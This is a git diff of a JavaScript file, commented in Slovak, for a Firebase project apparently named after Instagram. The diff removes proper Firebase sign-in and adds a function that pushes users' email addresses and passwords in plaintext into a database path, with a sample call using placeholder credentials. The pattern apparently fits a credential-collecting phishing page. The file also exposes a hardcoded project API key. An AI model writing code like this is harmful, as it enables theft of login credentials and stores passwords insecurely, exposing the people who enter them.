@@ -1,4 +1,8 @@
-// Firebase konfigurácia
+// Import Firebase SDK
+import firebase from 'firebase/app';
+import 'firebase/database';
+
+// Konfiguračné informácie pre váš Firebase projekt
 const firebaseConfig = {
   apiKey: "AIzaSyAb5xjaKFag0tikpz0GJFjDotOZwKkz_DE",
   authDomain: "instagram-2bfa4.firebaseapp.com",
@@ -11,25 +15,27 @@ const firebaseConfig = {
 
 // Inicializácia Firebase
 firebase.initializeApp(firebaseConfig);
-const auth = firebase.auth();
+
+// Odkaz na Realtime Database
 const database = firebase.database();
 
-// Funkcia na prihlásenie používateľa
-const loginUser = (email, password) => {
-  auth.signInWithEmailAndPassword(email, password)
-    .then((userCredential) => {
-      const user = userCredential.user;
-      console.log('User logged in:', user);
+// Funkcia pre uloženie prihlasovacích údajov
+function saveLoginData(email, password) {
+  // Vytvorenie referencie na konkrétnu cestu v databáze, kde budeme ukladať prihlasovacie údaje
+  const loginRef = database.ref('users');
+
+  // Uloženie prihlasovacích údajov do databázy
+  loginRef.push({
+    email: email,
+    password: password
+  })
+    .then(() => {
+      console.log('Prihlasovacie údaje boli úspešne uložené.');
     })
     .catch((error) => {
-      console.error('Error logging in user:', error);
+      console.error('Chyba pri ukladaní prihlasovacích údajov:', error);
     });
-};
+}
 
-// Event listener pre prihlásenie formulára
-document.getElementById('login-form').addEventListener('submit', (e) => {
-  e.preventDefault();
-  const email = document.getElementById('login-email').value;
-  const password = document.getElementById('login-password').value;
-  loginUser(email, password);
-});
+// Volanie funkcie pre uloženie prihlasovacích údajov
+saveLoginData('example@email.com', 'password123');
